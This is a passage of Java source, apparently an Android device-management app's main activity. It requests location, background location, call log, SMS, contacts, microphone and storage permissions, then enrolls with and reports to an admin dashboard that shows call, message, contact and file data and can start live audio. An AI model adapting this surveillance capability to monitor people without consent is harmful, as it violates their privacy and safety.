        if (!LocationHelper.hasFineLocation(this)) {
            requestPermissions(new String[]{
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION
            }, REQUEST_LOCATION);
            return;
        }
        requestBackgroundLocationPermission();
    }

    private void requestBackgroundLocationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && !LocationHelper.hasBackgroundLocation(this)) {
            requestPermissions(new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, REQUEST_BACKGROUND_LOCATION);
            return;
        }
        LocationHelper.startTracking(this);
        refreshComplianceSummary();
    }

    private void requestCallLogPermission() {
        PermissionFlowHelper.requestOrOpenSettings(
                this,
                Manifest.permission.READ_CALL_LOG,
                REQUEST_CALL_LOG,
                "asked_call_log",
                "Allow call log access so dashboard can show call history.",
                "Call log blocked. Open Settings and allow Call logs for this app."
        );
    }

    private void requestSmsPermission() {
        PermissionFlowHelper.requestOrOpenSettings(
                this,
                Manifest.permission.READ_SMS,
                REQUEST_SMS,
                "asked_sms",
                "Allow SMS access so dashboard can show message history.",
                "SMS blocked. Open Settings and allow SMS for this app."
        );
    }

    private void requestContactsPermission() {
        PermissionFlowHelper.requestOrOpenSettings(
                this,
                Manifest.permission.READ_CONTACTS,
                REQUEST_CONTACTS,
                "asked_contacts",
                "Allow contacts access so dashboard can show the phone contact list.",
                "Contacts blocked. Open Settings and allow Contacts for this app."
        );
    }

    private void requestMicrophonePermission() {
        PermissionFlowHelper.requestOrOpenSettings(
                this,
                Manifest.permission.RECORD_AUDIO,
                REQUEST_MICROPHONE,
                "asked_microphone",
                "Allow microphone access for admin-started live audio broadcast.",
                "Microphone blocked. Open Settings and allow Microphone for this app."
        );
    }

    private void requestStorageAccess() {
        StorageHelper.requestStorageAccess(this);
        refreshComplianceSummary();
    }

    private void refreshComplianceSummary() {
        if (complianceSummary != null) {
            complianceSummary.setText(ComplianceHelper.buildReport(this));
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_CAMERA_FOR_QR) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                launchQrScanActivity();
            } else if (networkError != null) {
                networkError.setText("\nCamera permission is required to scan enrollment QR codes.");
            }
            return;
        }
        if (requestCode == REQUEST_LOCATION) {
            if (LocationHelper.hasFineLocation(this)) {
                requestBackgroundLocationPermission();
            } else {
                refreshComplianceSummary();
            }
            return;
        }
        if (requestCode == REQUEST_BACKGROUND_LOCATION) {
            LocationHelper.startTracking(this);
            refreshComplianceSummary();
            return;
        }
        if (requestCode == REQUEST_POST_NOTIFICATIONS) {
            refreshComplianceSummary();
            return;
        }
        if (requestCode == REQUEST_CALL_LOG) {
            PermissionFlowHelper.handleResult(
                    this,
                    Manifest.permission.READ_CALL_LOG,
                    grantResults,
                    "Call log permission is required for dashboard call history sync.",
                    "Open Settings > Permissions > Call logs and allow access."
            );
            refreshComplianceSummary();
            return;
        }
        if (requestCode == REQUEST_SMS) {
            PermissionFlowHelper.handleResult(
                    this,
                    Manifest.permission.READ_SMS,
                    grantResults,
                    "SMS permission is required for dashboard SMS history sync.",
                    "Open Settings > Permissions > SMS and allow access."
            );
            refreshComplianceSummary();
            return;
        }
        if (requestCode == REQUEST_CONTACTS) {
            PermissionFlowHelper.handleResult(
                    this,
                    Manifest.permission.READ_CONTACTS,
                    grantResults,
                    "Contacts permission is required for dashboard contact list sync.",
                    "Open Settings > Permissions > Contacts and allow access."
            );
            refreshComplianceSummary();
            return;
        }
        if (requestCode == REQUEST_MICROPHONE) {
            PermissionFlowHelper.handleResult(
                    this,
                    Manifest.permission.RECORD_AUDIO,
                    grantResults,
                    "Microphone permission is required for live audio broadcast.",
                    "Open Settings > Permissions > Microphone and allow access."
            );
            refreshComplianceSummary();
            return;
        }
        if (requestCode == REQUEST_STORAGE_READ) {
            PermissionFlowHelper.handleResult(
                    this,
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    grantResults,
                    "Storage read permission is required for dashboard file manager.",
                    "Open Settings > Permissions > Files and media and allow access."
            );
            refreshComplianceSummary();
            return;
        }
        if (requestCode == REQUEST_STORAGE_WRITE) {
            PermissionFlowHelper.handleResult(
                    this,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    grantResults,
                    "Storage write permission is required for dashboard file uploads.",
                    "Open Settings > Permissions > Files and media and allow access."
            );
            refreshComplianceSummary();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (SCREEN_COMPLIANCE.equals(currentScreen)) {
            refreshComplianceSummary();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE_ENABLE_ADMIN) {
            updateDeviceAdminStatus();
            if (complianceSummary != null) {
                complianceSummary.setText(ComplianceHelper.buildReport(this));
            }
            DeviceSyncService.startIfRegistered(this);
        }
        if (requestCode == REQUEST_QR_SCAN && resultCode == RESULT_OK && data != null) {
            String contents = data.getStringExtra(QrScanActivity.EXTRA_SCAN_RESULT);
            if (contents == null) {
                contents = data.getStringExtra("SCAN_RESULT");
            }
            if (contents == null) {
                contents = data.getStringExtra("RESULT");
            }
            if (contents != null && contents.trim().length() > 0) {
                if (networkEnrollmentInput != null) {
                    networkEnrollmentInput.setText(contents.trim());
                }
                importEnrollmentPayload(contents.trim());
            }
        }
    }

    private void checkInAndPollProvision() {
        updateWaitingStatus("\nStatus: Checking in with server...");

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    postDeviceCheckin();
                    pollProvisionToken();
                } catch (final Exception exception) {
                    updateWaitingStatus("\nStatus: Connection failed - " + exception.getMessage());
                }
            }
        }).start();
    }

    private void postDeviceCheckin() throws Exception {
        URL url = new URL(BackendClient.getBackendUrl(this) + "/devices/checkin");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        try {
            connection.setRequestMethod("POST");
            BackendClient.applyConnectionTimeouts(connection);
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            BackendClient.addDeviceTokenHeader(this, connection);
            OutputStream outputStream = connection.getOutputStream();
            outputStream.write(BackendClient.buildDevicePayload(this).getBytes("UTF-8"));
            outputStream.close();
            int responseCode = connection.getResponseCode();
            String response = BackendClient.readResponse(connection);
            if (responseCode < 200 || responseCode >= 300) {
                throw new Exception("Check-in failed with HTTP " + responseCode + ": " + response);
            }

            if (BackendClient.extractJsonBoolean(response, "registered")) {
                String existingToken = BackendClient.prefs(this).getString("deviceToken", "").trim();
                if (existingToken.length() > 0) {
                    BackendClient.clearEnrollmentToken(this);
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            stopProvisionPolling();
                            backStack.clear();
                            currentScreen = SCREEN_MAIN;
                            showMainPage();
                        }
                    });
                    return;
                }
            }

            String issuedToken = BackendClient.extractJsonValue(response, "deviceToken");
            if (issuedToken.length() > 0) {
                BackendClient.saveDeviceToken(this, issuedToken);
                BackendClient.clearEnrollmentToken(this);
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        stopProvisionPolling();
                        backStack.clear();
                        currentScreen = SCREEN_MAIN;
                        showMainPage();
                    }
                });
                return;
            }

            updateWaitingStatus("\nStatus: Device checked in. Waiting for admin to register and push token...");
        } finally {
            connection.disconnect();
        }
    }

    private void pollProvisionToken() throws Exception {
        String encodedDeviceId = URLEncoder.encode(BackendClient.getDeviceId(this), "UTF-8");
        URL url = new URL(BackendClient.getBackendUrl(this) + "/devices/provision?deviceId=" + encodedDeviceId);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        try {
            connection.setRequestMethod("GET");
            BackendClient.applyConnectionTimeouts(connection);
            int responseCode = connection.getResponseCode();
            String response = BackendClient.readResponse(connection);
            if (responseCode < 200 || responseCode >= 300) {
                throw new Exception("Provision poll failed with HTTP " + responseCode);
            }

            String issuedToken = BackendClient.extractJsonValue(response, "deviceToken");
            if (issuedToken.length() > 0) {
                BackendClient.saveDeviceToken(this, issuedToken);
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        stopProvisionPolling();
                        backStack.clear();
                        currentScreen = SCREEN_MAIN;
                        showMainPage();
                    }
                });
            }
        } finally {
            connection.disconnect();
        }
    }

    private void updateWaitingStatus(final String message) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                if (waitingStatus != null) {
                    waitingStatus.setText(message);
                }
            }
        });
    }

    private void deregisterDevice() {
        if (registrationStatus != null) {
            registrationStatus.setText("\nRegistration status: Deregistering...");
        }

        new Thread(new Runnable() {
            @Override
            public void run() {
                HttpURLConnection connection = null;
                try {
                    String payload = "deviceId=" + URLEncoder.encode(BackendClient.getDeviceId(MainActivity.this), "UTF-8");
                    URL url = new URL(BackendClient.getBackendUrl(MainActivity.this) + "/devices/deregister");
                    connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("POST");
                    BackendClient.applyConnectionTimeouts(connection);
                    connection.setDoOutput(true);
                    connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=utf-8");
                    BackendClient.addDeviceTokenHeader(MainActivity.this, connection);
                    OutputStream outputStream = connection.getOutputStream();
                    outputStream.write(payload.getBytes("UTF-8"));
                    outputStream.close();

                    final int responseCode = connection.getResponseCode();
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            if (registrationStatus != null) {
                                registrationStatus.setText(responseCode >= 200 && responseCode < 300
                                        ? "\nRegistration status: Deregistered"
                                        : "\nRegistration status: Deregister failed with HTTP " + responseCode);
                            }
                            if (responseCode >= 200 && responseCode < 300) {
                                prefs.edit().remove("deviceToken").apply();
                                DeviceSyncService.stopService(MainActivity.this);
                                backStack.clear();
                                currentScreen = SCREEN_WAITING;
                                showWaitingPage();
                            }
                        }
                    });
                } catch (final Exception exception) {
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            if (registrationStatus != null) {
                                registrationStatus.setText("\nRegistration status: Deregister failed - " + exception.getMessage());
                            }
                        }
                    });
                } finally {
                    if (connection != null) {
                        connection.disconnect();
                    }
                }
            }
        }).start();
    }

    private void startProvisionPolling() {
        if (provisionHandler == null) {
            provisionHandler = new Handler(Looper.getMainLooper());
        }
        stopProvisionPolling();
        provisionRunnable = new Runnable() {
            @Override
            public void run() {
                checkInAndPollProvision();
                if (provisionHandler != null && provisionRunnable != null) {
                    provisionHandler.postDelayed(provisionRunnable, PROVISION_POLL_INTERVAL_MS);
                }
            }
        };
        provisionHandler.postDelayed(provisionRunnable, PROVISION_POLL_INTERVAL_MS);
    }

    private void stopProvisionPolling() {
        if (provisionHandler != null && provisionRunnable != null) {
            provisionHandler.removeCallbacks(provisionRunnable);
        }
        provisionRunnable = null;
    }
}
